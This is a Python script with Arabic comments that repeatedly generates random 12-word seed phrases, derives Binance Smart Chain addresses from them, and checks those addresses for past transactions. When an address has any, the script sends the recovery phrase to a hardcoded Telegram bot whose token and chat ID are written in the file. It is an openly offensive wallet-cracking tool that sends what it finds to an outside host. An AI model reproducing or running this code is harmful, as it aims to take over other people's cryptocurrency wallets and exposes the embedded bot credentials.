import random
import requests
from mnemonic import Mnemonic
from eth_account import Account
from web3 import Web3
import time

# تفعيل استخدام Mnemonic
Account.enable_unaudited_hdwallet_features()

# إعدادات Telegram
TELEGRAM_BOT_TOKEN = "7610237146:AAEZrmKRlrXk8fjV75TzgwptB4MWY81AVto"
TELEGRAM_CHAT_ID = "5440220685"

# قائمة مزودي RPC
RPC_PROVIDERS = [
    "https://bsc-dataseed.binance.org/",
    "https://bsc-dataseed1.defibit.io/",
    "https://bsc-dataseed1.ninicoin.io/",
    "https://rpc.ankr.com/bsc",
    "https://bsc.publicnode.com",
    "https://endpoints.omniatech.io/v1/bsc/mainnet/public"
]

# اختيار أول مزود فعال تلقائيًا
def get_working_web3():
    for rpc in RPC_PROVIDERS:
        try:
            print(f"محاولة الاتصال بـ {rpc}...")
            web3 = Web3(Web3.HTTPProvider(rpc))
            if web3.is_connected():
                print(f"✅ تم الاتصال بنجاح عبر: {rpc}")
                return web3
            else:
                print(f"❌ فشل الاتصال بـ: {rpc}")
        except Exception as e:
            print(f"⚠️ خطأ في الاتصال بـ {rpc}: {e}")
        
        # الانتظار لفترة قصيرة قبل المحاولة التالية
        time.sleep(0.001)
    
    raise Exception("❌ لا يوجد مزود RPC يعمل حالياً!")
# الاتصال بالشبكة
bsc = get_working_web3()

# دالة إرسال الرسائل إلى Telegram
def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
        requests.post(url, data=data)
    except Exception as e:
        print(f"خطأ في إرسال الرسالة إلى تليجرام: {e}")

# تحميل الكلمات من مكتبة Mnemonic
mnemo = Mnemonic("english")
wordlist = mnemo.wordlist

# قراءة العبارة من ملف نصي
def read_mnemonic_from_file(file_path):
    with open(file_path, 'r') as file:
        return file.read().strip()

# التحقق من أن العبارة صحيحة
def is_valid_mnemonic(phrase):
    return mnemo.check(phrase)

# التحقق من صحة الكلمات في ملف `mnemonic.txt`
def validate_mnemonic_file(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
        for line in lines:
            mnemonic_phrase = line.strip()
            if not is_valid_mnemonic(mnemonic_phrase):
                print(f"⚠️ العبارة غير صحيحة: {mnemonic_phrase}")
                return False
    return True

# جلب الرصيد بوحدة Wei
def get_bnb_balance(address):
    try:
        checksum_address = Web3.to_checksum_address(address)
        return bsc.eth.get_balance(checksum_address)
    except Exception as e:
        print(f"خطأ في جلب الرصيد عبر web3: {e}")
        return 0
# معالجة العبارة واستخراج العنوان والمعاملات السابقة
def process_mnemonic(phrase):
    if mnemo.check(phrase):  # فقط إذا كانت العبارة صحيحة
        try:
            account = Account.from_mnemonic(phrase)
            bnb_address = account.address

            # فحص عدد المعاملات السابقة (الـ nonce)
            nonce = bsc.eth.get_transaction_count(bnb_address)
            
            if nonce > 0:
                message = (
                    f"🎉 تم العثور على عنوان يحتوي على معاملات سابقة!\n"
                    f"🔐 عبارة الاسترداد:\n{phrase}\n"
                    f"📬 العنوان: {bnb_address}\n"
                    f"🔄 عدد المعاملات السابقة: {nonce}"
                )
                send_telegram(message)
                print(f"✅ FOUND! {bnb_address} - Transaction Count: {nonce}")
            else:
                print(f"❌ {bnb_address} - لا توجد معاملات سابقة.")
        except Exception as e:
            print(f"⚠️ خطأ أثناء معالجة العنوان: {e}")
    else:
        print("⚠️ عبارة غير صالحة، تم تجاهلها.")
# دمج 12 كلمة عشوائيًا من ملف `words.txt` وكتابتها إلى ملف `mnemonic.txt`
def generate_mnemonic():
    # فتح ملف الكلمات
    with open('words.txt', 'r') as file:
        words = file.readlines()

    # التأكد من أن هناك 2048 كلمة
    if len(words) != 2048:
        raise ValueError("الملف يجب أن يحتوي على 2048 كلمة.")

    # اختيار 12 كلمة عشوائيًا
    selected_words = random.sample(words, 12)

    # حفظ الكلمات المختارة في ملف جديد
    with open('mnemonic.txt', 'w') as output_file:
        output_file.write(' '.join(word.strip() for word in selected_words))

    print("تم دمج الكلمات وحفظها في ملف 'mnemonic.txt'.")

# تشغيل الكود فقط إذا كان الملف صحيحًا
def run_process():
    mnemonic_file = 'mnemonic.txt'

    # التحقق من صحة العبارات في الملف
    if validate_mnemonic_file(mnemonic_file):
        # قراءة العبارة من الملف
        mnemonic_phrase = read_mnemonic_from_file(mnemonic_file)

        # معالجة العبارة
        process_mnemonic(mnemonic_phrase)
    else:
        print("❌ الملف يحتوي على عبارات غير صالحة، لن يتم تنفيذ المعالجة.")

# تشغيل الكود بشكل مستمر مع عداد
counter = 0
while True:
    counter += 1
    print(f"🔄 المحاولة رقم {counter}")

    # إنشاء عبارة استرداد عشوائية إذا لزم الأمر
    generate_mnemonic()

    run_process()
    time.sleep(0.0000000001)  # تأخير لتقليل الضغط وتفادي الحظر
